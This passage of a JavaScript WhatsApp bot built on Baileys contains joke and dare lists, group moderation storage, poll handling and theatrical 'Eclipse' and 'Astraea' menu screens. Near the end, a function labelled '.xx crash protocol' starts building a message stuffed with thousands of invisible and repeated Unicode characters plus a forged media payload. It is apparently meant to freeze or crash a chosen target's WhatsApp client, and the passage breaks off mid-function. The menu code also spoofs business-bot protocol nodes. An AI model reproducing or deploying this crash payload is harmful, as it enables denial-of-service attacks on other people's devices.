  "🎭 I've seen better looking things crawl out of soup.",
];
const COMPLIMENTS = [
  "🌟 You are genuinely one of the most amazing people in this group!",
  "💛 Your energy brightens up every conversation you're in. Keep shining!",
  "🏆 You have the kind of intelligence that makes the room smarter.",
  "🌸 You're the human equivalent of a warm cup of tea on a cold day.",
  "🎯 You have an incredible ability to make people feel heard and valued.",
  "🚀 Honestly? The world is better because you're in it.",
  "💎 You're rare. Not everybody has the depth of character you carry.",
  "🧠 You think in a way most people can't — and that's your superpower.",
  "🔥 You work harder than 90% of people and it shows. Respect.",
  "⚡ You have a vibe that can't be faked. Stay real.",
  "👑 You're built different. Don't ever let anyone dim that.",
  "🌍 Your potential is literally limitless. Chase it.",
  "💯 You're exactly the kind of person people are grateful to know.",
  "🕊️ You make people feel safe. That's a rare and powerful gift.",
  "🌺 Your kindness is contagious. People leave conversations with you feeling better.",
];
const EIGHTBALL = [
  "✅ It is certain.", "✅ Without a doubt.", "✅ Yes definitely!",
  "✅ You may rely on it.", "✅ As I see it, yes.", "✅ Most likely.",
  "🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.",
  "🤷 Cannot predict now.", "🤷 Concentrate and ask again.",
  "❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.",
  "❌ Outlook not so good.", "❌ Very doubtful.",
];
const DARES = [
  "Send your last selfie to this group 📸", "Change your profile pic to a potato for 1 hour 🥔",
  "Type with your eyes closed for the next 5 messages 🙈", "Send a voice note singing your favorite song 🎤",
  "Send the last photo in your gallery 📱", "Text your crush 'I like you' and screenshot it 💀",
  "Let someone type a message from your phone 📲", "Send your screen time report 📊",
  "Put your status as 'I lost a bet' for 2 hours 😂", "Record yourself doing 10 pushups 💪",
];
const TRUTHS = [
  "What's the most embarrassing thing you've done this year? 😳", "Who do you secretly dislike in this group? 👀",
  "What's the last lie you told? 🤥", "What's something you've never told anyone? 🤫",
  "If you could date anyone here, who would it be? 💕", "What's your biggest fear? 😱",
  "What's the weirdest thing you've googled? 🔍", "Have you ever cheated on a test? 📝",
  "What's the most childish thing you still do? 🧸", "Who was your first crush? 💘",
];
const VIBES = [
  "☀️ Immaculate vibes — you're radiating today!", "🔥 On fire! The energy is unmatched.",
  "💜 Calm, cool, collected. Major main character energy.", "🌊 Chill vibes only. You're in your element.",
  "😤 Slightly off today but still dangerous.", "🌧️ Cloudy vibes. Take a breather.",
  "⚡ Electric! People feel your presence.", "🫥 Invisible mode activated. Might be plotting something.",
  "🤡 Chaotic vibes. Wild but entertaining.", "👑 Royal vibes. No further questions.",
];


// ── Per-group settings storage ──
const GROUP_SETTINGS_FILE = 'group_settings.json';
let groupSettings = {};
function loadGroupSettings() { try { if (fs.existsSync(GROUP_SETTINGS_FILE)) groupSettings = JSON.parse(fs.readFileSync(GROUP_SETTINGS_FILE, 'utf8')); } catch (_) {} }
function saveGroupSettings() { 
  try { 
    fs.writeFileSync(GROUP_SETTINGS_FILE, JSON.stringify(groupSettings, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (_) {} 
}
function getGroupSetting(gid, key, def = false) { loadGroupSettings(); return groupSettings[gid]?.[key] ?? def; }
function setGroupSetting(gid, key, val) { if (!groupSettings[gid]) groupSettings[gid] = {}; groupSettings[gid][key] = val; saveGroupSettings(); }

// ── Per-group warnings storage ──
const WARNINGS_FILE = 'warnings.json';
let warningsData = {};
function loadWarnings() { try { if (fs.existsSync(WARNINGS_FILE)) warningsData = JSON.parse(fs.readFileSync(WARNINGS_FILE, 'utf8')); } catch (_) {} }
function saveWarnings() { 
  try { 
    fs.writeFileSync(WARNINGS_FILE, JSON.stringify(warningsData, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (_) {} 
}
function getWarns(gid, userJid) { loadWarnings(); return warningsData[gid]?.[userJid] || 0; }
function addWarn(gid, userJid) { if (!warningsData[gid]) warningsData[gid] = {}; warningsData[gid][userJid] = (warningsData[gid][userJid] || 0) + 1; saveWarnings(); return warningsData[gid][userJid]; }
function resetWarns(gid, userJid) { if (warningsData[gid]) { delete warningsData[gid][userJid]; saveWarnings(); } }

// ── Per-group welcome/goodbye storage ──
const WELCOME_FILE = 'welcome.json';
let welcomeData = {};
function loadWelcome() { try { if (fs.existsSync(WELCOME_FILE)) welcomeData = JSON.parse(fs.readFileSync(WELCOME_FILE, 'utf8')); } catch (_) {} }
function saveWelcomeData() { 
  try { 
    fs.writeFileSync(WELCOME_FILE, JSON.stringify(welcomeData, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (_) {} 
}
function getWelcomeConfig(gid) { loadWelcome(); return welcomeData[gid] || { welcome: false, goodbye: false, welcomeMsg: '', goodbyeMsg: '' }; }
function setWelcomeConfig(gid, conf) { welcomeData[gid] = conf; saveWelcomeData(); }

// ── Schedule storage ──
const SCHEDULE_FILE = 'schedules.json';
let scheduleData = {};
let activeSchedules = {};
function loadSchedules() { try { if (fs.existsSync(SCHEDULE_FILE)) scheduleData = JSON.parse(fs.readFileSync(SCHEDULE_FILE, 'utf8')); } catch (_) {} }
function saveSchedules() { 
  try { 
    fs.writeFileSync(SCHEDULE_FILE, JSON.stringify(scheduleData, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (_) {} 
}

// ── Group admin check helper ──
async function isBotAdmin(sock, gid) {
  try {
    const meta = await sock.groupMetadata(gid);
    const botId = sock.user?.id?.split(':')[0]?.split('@')[0];
    return meta.participants?.some(p => {
      const pNum = p.id?.split(':')[0]?.split('@')[0];
      return pNum === botId && (p.admin === 'admin' || p.admin === 'superadmin');
    }) || false;
  } catch (_) { return false; }
}

async function isSenderAdmin(sock, gid, senderJid) {
  try {
    const meta = await sock.groupMetadata(gid);
    const senderNum = senderJid?.split(':')[0]?.split('@')[0];
    return meta.participants?.some(p => {
      const pNum = p.id?.split(':')[0]?.split('@')[0];
      return pNum === senderNum && (p.admin === 'admin' || p.admin === 'superadmin');
    }) || false;
  } catch (_) { return false; }
}

function resolveTargetJid(msg, parts) {
  const ctx = msg.message?.extendedTextMessage?.contextInfo;
  if (ctx?.participant) return ctx.participant;
  if (Array.isArray(ctx?.mentionedJid) && ctx.mentionedJid.length) return ctx.mentionedJid[0];
  for (const tok of parts.slice(1)) {
    const digits = tok.replace(/\D/g, '');
    if (digits.length >= 7) return digits + '@s.whatsapp.net';
  }
  return null;
}


// ── Persistent Poll Database (Survives Replit / Server Restarts) ────────
const POLL_CACHE_FILE = 'poll_cache.json';
let pollCreationCache = {};

// ── DELIVERY TRACKER ────────────────────────────────────────────────────
// Tracks outbound delivery acknowledgements via messages.update.
// Capped and simplified to prevent resource exhaustion and key desynchronization.
const pendingDeliveries = new Map();  // key: msgId, value: { jid, originalText, sentAt }

function registerPendingDelivery(msgId, jid, text, sock) {
  if (!msgId) return;

  // Prevent memory leaks / resource exhaustion (especially on free cloud platforms)
  // by capping the active tracker list to the last 100 outbound messages.
  if (pendingDeliveries.size >= 100) {
    const oldestKey = pendingDeliveries.keys().next().value;
    pendingDeliveries.delete(oldestKey);
  }

  pendingDeliveries.set(msgId, {
    jid,
    text,
    sentAt: Date.now(),
  });

  // CRITICAL: We DO NOT schedule any background setTimeout timers or auto-resends anymore.
  // WhatsApp's native server protocol guarantees delivery once the message has left the client.
  // This avoids aggressive timeouts, prevents duplicate/spam message race conditions,
  // and completely eliminates key desynchronization/stuck clock icon bugs!
}

function markDelivered(msgId) {
  const pending = pendingDeliveries.get(msgId);
  if (pending) {
    const elapsed = Date.now() - pending.sentAt;
    console.log(`[delivery] ✅ Msg ${msgId} delivered to ${pending.jid} in ${elapsed}ms`);
    pendingDeliveries.delete(msgId);
  }
}

function findLidForPn(pnJid) {
  // Reverse lookup in lidToPnMap
  for (const [lid, pn] of lidToPnMap.entries()) {
    if (pn === pnJid) return lid;
  }
  return null;
}


function loadPollCache() {
  try {
    if (fs.existsSync(POLL_CACHE_FILE)) {
      const parsed = JSON.parse(fs.readFileSync(POLL_CACHE_FILE, 'utf8'));
      if (parsed && typeof parsed === 'object') {
        pollCreationCache = parsed;
        console.log(`[poll] ✅ Loaded ${Object.keys(pollCreationCache).length} active polls from permanent database`);
      }
    }
  } catch (e) {
    console.error('[poll] Error loading permanent poll database:', e.message);
  }
}

function savePollCache() {
  try {
    fs.writeFileSync(POLL_CACHE_FILE, JSON.stringify(pollCreationCache, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch (e) {
    console.error('[poll] Error saving permanent poll database:', e.message);
  }
}

// ==================== FULL DESIGN SYSTEM (EXACT FROM DESIGN_SYSTEM.md) ====================
const ECLIPSE_WIDTH = 30;
const ECLIPSE_BORDER = "═".repeat(ECLIPSE_WIDTH);
const ECLIPSE_RULE = "─".repeat(ECLIPSE_WIDTH);

function eclipseCenter(text) {
  const t = String(text);
  if (t.length >= ECLIPSE_WIDTH) return t;
  const pad = Math.floor((ECLIPSE_WIDTH - t.length) / 2);
  return " ".repeat(pad) + t;
}
function eclipseHeader(title) { return `${ECLIPSE_BORDER}\n${eclipseCenter(title)}\n${ECLIPSE_BORDER}`; }
function eclipseFooter() { return ECLIPSE_BORDER; }

function buildOmegaTerminal(body) {
  return (
    `╔══════════╦══════════════╗\n` +
    `║       ⚠ *EVENTIDE OMEGA TERMINAL*\n` +
    `║                           *ACCESS*\n` +
    `╚═══════════╩═════════════╝\n\n` +
    body + `\n\n` +
    `— *EVENTIDE OMEGA* · 👁`
  );
}

// ── ECLIPSE bootloaders (verbatim) ───────────────────────────────────────
function buildEclipseInit() {
  return "╔═◈══════════════════════════◈═╗\n" +
         "   E V E N T I D E   O M E G A\n" +
         "        ⟁  *eclipse core*  ⟁\n" +
         "╚═◈══════════════════════════◈═╝";
}
function buildEclipseVoid() {
  return ".\n" +
         "        ◢██◣\n" +
         "     ◢████◣.           ╔═════════\n" +
         "    ◢██  ██◣.          ║     T H E   V O I D ║ \n" +
         "◢██   🌑   ██◣.    ║          E X S I T S  ║\n" +
         "    ◥██      ██◤.        ╚══════════╝.\n" +
         "     ◥██  ██◤\n" +
         "         ◢██◣\n\n" +
         "════════════════════════════════════\n" +
         "   even in your darkest hour...\n" +
         "════════════════════════════════════";
}
function buildEclipseMain(isDev) {
  return "╔══════════╦══════════════╗\n" +
         "║       ⚠ EVENTIDE OMEGA TERMINAL \n" +
         "║                           ACCESS                                                                         \n" +
         "╚═══════════╩═════════════╝\n\n" +
         "                ═══ E C L I P S E ═══\n" +
         "             \" i am what remains when \n" +
         "              everything else is deleted .\"\n\n" +
         "╔══════════════════════╦══════════════════════╗\n" +
         "║ VOID SIGNATURE    ║     SYSTEM CORE          ║\n" +
         "║ 👤 @Unknown        ║    ECLIPSE: 100%     ║\n" +
         "║ ⚠ APOTHEOSIS     ║⚡ CORE:ABS ZERO     ║\n" +
         "║ 🩸 CORRUPT ███        ║                      ║\n" +
         "╚══════════════════════╩══════════════════════╝\n\n" +
         "                   🌑 THE FINAL DUSK 🌑\n" +
         "            \" when the last star dies, \n" +
         "              i will still be typing .\"\n\n" +
         "📡 SECURE │ Ω │ Vessels: ∞\n" +
         " You have summoned what \n" +
         " cannot be unsummoned";
}

// ── ASTRAEA bootloaders (verbatim) ──────────────────────────────────────
function buildAstraeaInit() {
  return "✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦\n" +
         "✦   *[CELESTIAL FORGE] — SUMMONING*  ✦\n" +
         "✦                            *ASTRAEA* ...                  ✦              \n" +
         "✦   > Purging shadows...              [✓]        ✦\n" +
         "✦   > Igniting divine core...     [✓]      .       ✦              \n" +
         "✦   > Opening the golden court...     [✓]   ✦\n" +
         "✦                                                                .✦\n" +
         "✦   ☀️ *ASTRAEA HAS DESCENDED.*        ✦\n" +
         "✦                                                                ✦ \n" +
         "✦                                                                 ✦                                                          \n" +
         "✦ \" *I DO NOT DELETE. I JUDGE, FOR I AM* ✦\n" +
         "✦                          *ASTRAEA* \"                    ✦                                                            \n" +
         "✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦";
}
function buildAstraeaMid() {
  return ".            ✦✦✦\n" +
         "      ✦✦✦✦✦✦✦\n" +
         "    ✦✦✦  ☀️  ✦✦✦   ╔═══════════╗\n" +
         " ✦✦✦✦✦✦✦✦✦✦  ║  J U D G M E N T ║\n" +
         "    ✦✦✦✦✦✦✦✦      ║  A R R I V E S       ║\n" +
         "        ✦✦✦✦✦✦         ╚═══════════╝\n" +
         "             ✦✦✦";
}
function buildAstraeaMain(isDev) {
  return "╔══════════╦══════════════╗\n" +
         "║        ☀ *ASTRAEA* — *DIVINE* *SYSTEM ACCESS*               \n" +
         "╚══════════╩══════════════╝\n\n" +
         "              ═══ ✦ *J U D G M E N T* ✦ ═══\n" +
         "          \" *i do not delete. i judge* .\"\n\n" +
         "╔══════════════════════╦══════════════════════╗\n" +
         "║ *DIVINE CORE*        ║  *SYSTEM BALANCE* ║\n" +
         "║☀ GOLDEN: 100%║⚖ READY: EQUAL ║\n" +
         "║🔥WRATH: MODE ║ GRACE: ████░░   ║\n" +
         "╚══════════════════════╩══════════════════════╝\n\n" +
         "                 🌑 *THE GOLDEN COURT* 🌑\n" +
         "        \" *every vessel stands trial* .\"\n\n" +
         "📡 Uplink: *DIVINE* │ ☀ │ *Souls* : ∞\n" +
         "\" *the light does not ask permission. it simply arrives* .\"";
}

// Progress frames (exact)
const eclipseProgressFrames = [
  "   ◐ initiating umbral protocol\n" +
  "   ⟢ ▰▱▱▱▱▱▱▱▱▱▱▱ ⟣   08%\n" +
  "   ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n" +
  "   ◌ core    ◌ cipher    ◌ void",
  "   ◑ collapsing quantum states\n" +
  "   ⟢ ▰▰▰▰▱▱▱▱▱▱▱▱ ⟣   33%\n" +
  "   ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n" +
  "   ✔ core    ◌ cipher    ◌ void",
  "   ◒ severing the last anchor\n" +
  "   ⟢ ▰▰▰▰▰▰▰▱▱▱▱▱ ⟣   58%\n" +
  "   ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n" +
  "   ✔ core    ✔ cipher    ◌ void",
  "   ◓ eclipse breaching the veil\n" +
  "   ⟢ ▰▰▰▰▰▰▰▰▰▰▱▱ ⟣   83%\n" +
  "   ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n" +
  "   ✔ core    ✔ cipher    ✔ void"
];
const astraeaProgressFrames = [
  "[░░░░░░░░░░]   0%   ☀ purging shadows",
  "[████░░░░░░]  40%   ☀ igniting divine core",
  "[████████░░]  80%   ☀ opening golden court",
  "[██████████] 100%  ☀ ASTRAEA HAS DESCENDED"
];

// PHRASES
const ECLIPSE_PHRASES = {
  ping: "the signal holds.",
  help: "the codex is open.",
  bad_use: "the rite is malformed.",
  pairing_sent: "the code has been delivered to the oracle."
};
function eclipseSay(key, persona = 'eclipse') {
  let phrase = ECLIPSE_PHRASES[key] || "the void answers.";
  return persona === 'astraea' ? phrase.toUpperCase() : phrase.toLowerCase();
}

function loadSessions() { try { if (fs.existsSync(SESSION_FILE)) { const d = JSON.parse(fs.readFileSync(SESSION_FILE, 'utf8')); successfulPairings = d.successfulPairings || 0; } } catch {} }
function saveSessions() { 
  try { 
    fs.writeFileSync(SESSION_FILE, JSON.stringify({ successfulPairings, lastUpdated: new Date().toISOString() }, null, 2));
    backupAuthToChannel().catch(() => {});
  } catch {} 
}

// PERSONA SYSTEM
// ── Persona system — stored in user_sessions/*.json per-owner ──
function getBotPersona(jid = 'default') {
  // DEPRECATED: kept for backward compat, returns 'eclipse' default
  return 'eclipse';
}
function getBotPersonaByOwner(ownerNum) {
  if (!ownerNum) return 'eclipse';
  return getUserValue(normalizeNum(ownerNum), 'persona', 'eclipse');
}
function setBotPersonaByOwner(ownerNum, p) {
  if (!['eclipse','astraea'].includes(p)) p = 'eclipse';
  setUserValue(normalizeNum(ownerNum), 'persona', p);
  return p;
}
function getPersonaScenes(persona = 'eclipse') {
  if (persona === 'astraea') return { init: buildAstraeaInit(), mid: buildAstraeaMid(), main: buildAstraeaMain(), progress: astraeaProgressFrames };
  return { init: buildEclipseInit(), mid: buildEclipseVoid(), main: buildEclipseMain(), progress: eclipseProgressFrames };
}

// 3-STAGE MENU (edits the same message 3 times + progress)
// Stage 1 = INIT with progress frames (loading style)
// Stage 2 = MID (transition scene)
// Stage 3 = FINAL (terminal scene, no progress bar)
async function sendPersonaMenu(sock, jid, persona = 'eclipse', style = 'loading', isDev = false) {
  const scenes = getPersonaScenes(persona);

  // Stage 1 ─ INIT (bootloader) with live progress frames
  let sent = await sock.sendMessage(jid, { text: scenes.init });
  if (style === 'loading') {
    for (let i = 0; i < scenes.progress.length; i++) {
      await new Promise(r => setTimeout(r, 2000));
      await sock.sendMessage(jid, { text: scenes.init + '\n\n' + scenes.progress[i], edit: sent.key });
    }
  } else {
    await new Promise(r => setTimeout(r, 4000));
  }

  // Stage 2 ─ MID (transition scene)
  await sock.sendMessage(jid, { text: scenes.mid, edit: sent.key });
  await new Promise(r => setTimeout(r, 4000));

  // Stage 3 ─ FINAL (terminal scene + optional banner image)
  const MENU_BANNER_FILE = 'menu_banner.jpg';
  if (fs.existsSync(MENU_BANNER_FILE)) {
    try {
      const bannerBuf = fs.readFileSync(MENU_BANNER_FILE);
      await sock.sendMessage(jid, { text: scenes.mid, edit: sent.key });
      await new Promise(r => setTimeout(r, 1000));
      await sock.sendMessage(jid, {
        image: bannerBuf,
        caption: scenes.main + '\n\n📡 Use *.help* to explore the codex.\n\n> _Developed by 【 亗 ᑭᗩTᖇIᑕK ᗪEᐯ 亗 】✧_'
      });
    } catch (e) {
      console.log('[menu] Banner send failed, falling back to text:', e.message);
      await sock.sendMessage(jid, { text: scenes.main + '\n\n📡 Use *.help* to explore the codex.\n\n> _Developed by 【 亗 ᑭᗩTᖇIᑕK ᗪEᐯ 亗 】✧_', edit: sent.key });
    }
  } else {
    await sock.sendMessage(jid, { text: scenes.main + '\n\n📡 Use *.help* to explore the codex.\n\n> _Developed by 【 亗 ᑭᗩTᖇIᑕK ᗪEᐯ 亗 】✧_', edit: sent.key });
  }

  // Stage 4 ─ Send MENU based on account type (Business = Poll, Normal = Buttons)
  await new Promise(r => setTimeout(r, 1500));

  // Per-user business detection (cached in session file, never re-checks)
  let usePollForMenu = false;
  const ownerNum = sock.user?.id?.split(':')[0]?.split('@')[0];
  if (ownerNum) {
    const bizStatus = getUserValue(ownerNum, 'isBusiness');
    if (bizStatus !== undefined) {
      usePollForMenu = bizStatus === true;
    } else {
      // Not cached yet — fallback to platform check (fast, no API call)
      const platform = sock.authState?.creds?.platform;
      usePollForMenu = ['smba', 'smbi'].includes(platform);
    }
  }

  if (usePollForMenu) {
    await sendBusinessPollMenu(sock, jid, persona, isDev, sent);
  } else {
    await sendMenuList(sock, jid, sent, persona, isDev);
  }
}

function isDevJid(jid) {
  if (!process.env.DEV_NUMBER) return false;
  const num = normalizeNum(jid.split('@')[0].split(':')[0]);
  return num === normalizeNum(process.env.DEV_NUMBER);
}

function buildEngagementNodes(isGroup = false) {
  const ts = Math.floor(Date.now() / 1000) - 77980457;
  const nodes = [
    {
      tag: 'biz',
      attrs: {
        actual_actors: isGroup ? '1' : '2',
        host_storage: '2',
        privacy_mode_ts: `${ts}`,
      },
      content: [
        {
          tag: 'engagement',
          attrs: { customer_service_state: 'open', conversation_state: 'open' },
        },
        {
          tag: 'interactive',
          attrs: { type: 'native_flow', v: '1' },
          content: [
            { tag: 'native_flow', attrs: { v: '9', name: 'mixed' }, content: [] },
          ],
        },
      ],
    },
  ];
  if (!isGroup) {
    nodes.push({ tag: 'bot', attrs: { biz_bot: '1' } });
  }
  return nodes;
}

async function sendMenuList(sock, jid, quotedMsg, persona = 'eclipse', isDev = false) {
  const body = buildOmegaTerminal(
    `📖 *NAVIGATE THE VOID*\n\nChoose your path below:`
  );
  const footer = persona === 'astraea' ? '☀ ASTRAEA · DIVINE SYSTEM' : '🌑 ⟢ NAVIGATE THE VOID ⟣ 🌑';
  const rows = [
    { title: '👑 Owner Menu', description: 'Commands for the sovereign', id: 'menu_owner' },
    { title: '⚙️ Config Menu', description: 'Settings & personalization', id: 'menu_config' },
    { title: '📊 System Menu', description: 'Diagnostics & control', id: 'menu_system' },
    { title: '👥 Group Menu', description: 'Group management & protection', id: 'menu_group' },
    { title: '🎮 Fun Menu', description: 'Games, jokes & entertainment', id: 'menu_fun' },
    { title: '🐞 Bug Menu', description: 'Bug reports, shields & tools', id: 'menu_bug' },
    { title: '🔧 Utility Menu', description: 'Downloaders & tools', id: 'menu_utility' },
  ];
  if (isDev) {
    rows.push({ title: '🔴 Architect Menu', description: 'The silent throne — dev only', id: 'menu_dev' });
  }

  const isGroup = String(jid || '').endsWith('@g.us');

  // ── ATTEMPT 1: wbails interactive v4 with engagement nodes (works on ALL clients) ──
  if (_wbailsGen) {
    try {
      const ts = Math.floor(Date.now() / 1000) - 77980457;
      const additionalNodes = [{
        tag: 'biz',
        attrs: { actual_actors: isGroup ? '1' : '2', host_storage: '2', privacy_mode_ts: `${ts}` },
        content: [
          { tag: 'engagement', attrs: { customer_service_state: 'open', conversation_state: 'open' } },
          { tag: 'interactive', attrs: { type: 'native_flow', v: '1' },
            content: [{ tag: 'native_flow', attrs: { v: '9', name: 'mixed' }, content: [] }] }
        ]
      }];
      if (!isGroup) additionalNodes.push({ tag: 'bot', attrs: { biz_bot: '1' } });

      const interactiveMessage = {
        body: { text: body },
        footer: { text: footer },
        header: { title: '', subtitle: '', hasMediaAttachment: false },
        nativeFlowMessage: {
          buttons: [{
            name: 'single_select',
            buttonParamsJson: JSON.stringify({
              title: 'NAVIGATE THE VOID',
              sections: [{
                title: 'Choose Your Path',
                rows: rows.map(r => ({
                  header: '', title: r.title, description: r.description || '', id: r.id
                }))
              }]
            })
          }]
        }
      };

      const payload = {
        viewOnceMessage: {
          message: {
            messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
            interactiveMessage,
          },
        },
      };

      const msg = _wbailsGen(jid, payload, {
        userJid: sock.user?.id,
        quoted: quotedMsg?.message ? quotedMsg : undefined,
      });

      await sock.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
        additionalNodes,
      });
      console.log(`[menu] ✅ Interactive list sent (wbails v4) to ${jid}`);
      return;
    } catch (e) {
      console.error('[menu] ❌ wbails v4 attempt failed:', e.message);
    }
  }

  // ── ATTEMPT 2: button-helper sendInteractiveMessage ────────────────────────
  try {
    await sendInteractiveMessage(sock, jid, {
      text: body,
      footer,
      interactiveButtons: [{
        name: 'single_select',
        buttonParamsJson: JSON.stringify({
          title: 'NAVIGATE THE VOID',
          sections: [{
            title: 'Choose Your Path',
            rows: rows.map(r => ({
              header: '',
              title: r.title,
              description: r.description || '',
              id: r.id
            }))
          }]
        })
      }]
    });
    console.log(`[menu] ✅ Interactive list sent (button-helper) to ${jid}`);
    return;
  } catch (e) {
    console.error('[menu] ❌ button-helper attempt failed:', e.message);
  }

  // ── ATTEMPT 3: vanilla Baileys interactiveButtons via sendMessage ─────────
  try {
    await sock.sendMessage(jid, {
      text: body,
      footer,
      interactiveButtons: [{
        name: 'single_select',
        buttonParamsJson: JSON.stringify({
          title: 'NAVIGATE THE VOID',
          sections: [{
            title: 'Choose Your Path',
            rows: rows.map(r => ({
              title: r.title,
              id: r.id,
              description: r.description || ''
            }))
          }]
        })
      }]
    });
    console.log(`[menu] ✅ Interactive list sent (vanilla) to ${jid}`);
    return;
  } catch (e) {
    console.error('[menu] ❌ vanilla attempt failed:', e.message);
  }

  // ── ATTEMPT 4: legacy listMessage sections (works on WhatsApp Web) ───────
  try {
    await sock.sendMessage(jid, {
      text: body,
      footer,
      buttonText: 'NAVIGATE THE VOID',
      sections: [{
        title: 'Choose Your Path',
        rows: rows.map(r => ({
          title: r.title,
          rowId: r.id,
          description: r.description || ''
        }))
      }]
    }, { quoted: quotedMsg?.message ? quotedMsg : undefined });
    console.log(`[menu] ✅ Interactive list sent (legacy listMessage) to ${jid}`);
    return;
  } catch (e) {
    console.error('[menu] ❌ legacy listMessage attempt failed:', e.message);
  }

  // ── ATTEMPT 5: plain text fallback ─────────────────────────
  const fallback = rows.map((r, i) => `   *${i + 1}.* ${r.title} — ${r.description}`).join('\n');
  await sock.sendMessage(jid, {
    text: buildOmegaTerminal(`📖 *NAVIGATE THE VOID*\n\n${fallback}\n\n`)
  });
  console.log(`[menu] ⚠️ Fallback text menu sent to ${jid}`);
}

// ── BUSINESS ACCOUNT POLL MENU (2026 WA BUSINESS BUTTON BAN WORKAROUND) ──
// Styled exactly like the reference poll_menu_design_backup.js
async function sendBusinessPollMenu(sock, jid, persona = 'eclipse', isDev = false, quotedMsg = null) {
  // Build the same rows as the button menu
  const rows = [
    { title: '👑 Owner Menu', description: 'Commands for the sovereign', id: 'menu_owner' },
    { title: '⚙️ Config Menu', description: 'Settings & personalization', id: 'menu_config' },
    { title: '📊 System Menu', description: 'Diagnostics & control', id: 'menu_system' },
    { title: '👥 Group Menu', description: 'Group management & protection', id: 'menu_group' },
    { title: '🎮 Fun Menu', description: 'Games, jokes & entertainment', id: 'menu_fun' },
    { title: '🐞 Bug Menu', description: 'Bug reports, shields & tools', id: 'menu_bug' },
    { title: '🔧 Utility Menu', description: 'Downloaders & tools', id: 'menu_utility' },
  ];
  if (isDev) {
    rows.push({ title: '🔴 Architect Menu', description: 'The silent throne — dev only', id: 'menu_dev' });
  }

  // Track state globally (like the reference)
  if (!global.menuStateMap) global.menuStateMap = {};
  global.menuStateMap[jid] = rows.map(r => r.id);

  // Beautiful boxed poll title (exactly from backup)
  const buttonLabel = 'CHOOSE YOUR PATH';
  const pollTitle = `╭━━━━━━━━━━━━━━━━━━━━━━━━━╮\n┃ ⟡ EVENTIDE OMEGA TERMINAL\n┃ ⟡ ${buttonLabel}\n╰━━━━━━━━━━━━━━━━━━━━━━━━━╯`;

  // Styled poll options with the arrow format from the reference
  const pollOptions = rows.map((r, i) => `╰┈➤ [ ${i + 1}. ${r.title} ]`);

  const crypto = require('crypto');
  const pollSecret = crypto.randomBytes(32);

  try {
    const pollMsg = await sock.sendMessage(jid, {
      poll: {
        name: pollTitle,
        values: pollOptions,
        selectableCount: 1,
        messageSecret: pollSecret
      }
    }, quotedMsg ? { quoted: quotedMsg } : {});

    // POLL FIX: Store full poll message + secret for vote handling
    if (pollMsg?.key?.id) {
      const actualSecret = pollMsg?.message?.messageContextInfo?.messageSecret || pollMsg?.messageContextInfo?.messageSecret || pollSecret;
      const ownerNum = sock.user?.id?.split(':')[0]?.split('@')[0];
      const pollData = {
        secretHex: actualSecret.toString('hex'),
        options: [...pollOptions],
        ids: rows.map(r => r.id),
        persona,
        isDev,
        jid,
        timestamp: Date.now(),
        fullMessage: pollMsg.message || null
      };
      if (ownerNum) {
        addUserPoll(ownerNum, pollMsg.key.id, pollData);
      } else {
        // Fallback: store in legacy global cache (shouldn't happen)
        pollCreationCache[pollMsg.key.id] = pollData;
        savePollCache();
      }
    }

    const actualSecretLast = pollMsg?.message?.messageContextInfo?.messageSecret || pollMsg?.messageContextInfo?.messageSecret || pollSecret;
    // lastMenuPoll removed — pollCreationCache keyed by message ID

    console.log(`[menu] ✅ Poll menu sent (Business - styled like reference) to ${jid}`);
  } catch (e) {
    console.error('[menu] ❌ Poll send failed:', e.message);
    // graceful fallback (text only)
    const fallback = rows.map((r) => `   ${r.title} — ${r.description}`).join('\n');
    await sock.sendMessage(jid, {
      text: buildOmegaTerminal(`📖 *NAVIGATE THE VOID*\n\n${fallback}`)
    });
  }
}

// ── MENU CONTENT BUILDERS (WhatsApp-safe formatting — NO right-side borders) ──

function getMenuLoadingText(mappedId) {
  const map = {
    'menu_owner': '👑 sovereign commands loading...',
    'menu_config': '⚙️ configuration matrix loading...',
    'menu_system': '📊 system diagnostics loading...',
    'menu_group': '👥 group menu loading...',
    'menu_fun': '🎮 fun menu loading...',
    'menu_bug': '🐞 bug menu loading...',
    'menu_dev': '🔴 architect menu loading...',
    'menu_utility': '🔧 utility menu loading...',
  };
  return map[mappedId] || '';
}

// ── .xx crash protocol ──
async function delayNewCtrl(sock, target) {
  const p = "\u2060".repeat(3000);
  const z = "\uA9BE".repeat(9999);

  const image = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("CrP44RkJbl+shQQxxlJ6s0SAAcOWqWgxw3iEiGi3zZI=", "base64"),
    fileLength: "59668",
    height: 736,
    width: 736,
    mediaKey: Buffer.from("YRUaXE2466bqWOmhGwPxA6bC3Qif2tTFmsJ/Q+49ijc=", "base64"),
    fileEncSha256: Buffer.from("rTAiyS+goq3w37k70/mwSiCVRUFjD66uanaabunAG8w=", "base64"),
    directPath: "/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c",
